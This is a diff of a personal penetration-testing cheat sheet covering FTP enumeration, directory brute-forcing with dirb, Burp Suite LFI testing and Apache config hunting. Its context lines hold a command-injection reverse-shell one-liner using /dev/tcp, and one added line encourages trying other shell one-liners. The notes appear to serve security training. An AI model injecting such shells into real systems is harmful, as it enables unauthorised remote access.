@@ -551,8 +551,11 @@ Nbtscan -r *target*/24
 Refer to pen testing red workbook 
 
 - Enumeration tab
-- FTP-Name:
-- FTP-version:
+
+- FTP-Name: *ftp-version*
+
+- FTP-version: *ftp-version*
+
 - Anonymous login:
 - CeasarScan.py
 - bulletftp.py
@@ -1335,6 +1338,9 @@ setup lister
 
 ```
 ;bash -i >& /dev/tcp/*localhost*/1234 0>&1
+
+Try other ways to execute one liner shells with command injection 
+
 ```
 
 
@@ -1349,7 +1355,7 @@ Not recursive
 ### Dirb
 
 ```
-dirb http://*target* -r -o dirb-INSERTIPADDRESS.txt
+dirb http://*target* -r -o dirb-*target*.txt
 ```
 
 start dirbbuster gui with 
@@ -1406,6 +1412,8 @@ nmap --script -http-enum --script-args http-enum.basepath='pub/' *target*
 Use burp suite right away and spider the host looking for intel
 
 Refer to burp suite essentials book on kindle if needed. 
+
+Send burp requests to intruder and use sniper to conduct lfi testing. 
 
 
 ### Gobuster
@@ -1606,7 +1614,7 @@ Curl *target*/README.md | HEAD -n 40
 ```
 Get the version anyway possible
 
-### If the server is apache then look for vhosts files and try to get the config
+### If the server is apache then look for vhosts files and try to get the config files. Look through config files for hidden information
 
 example 
 ```
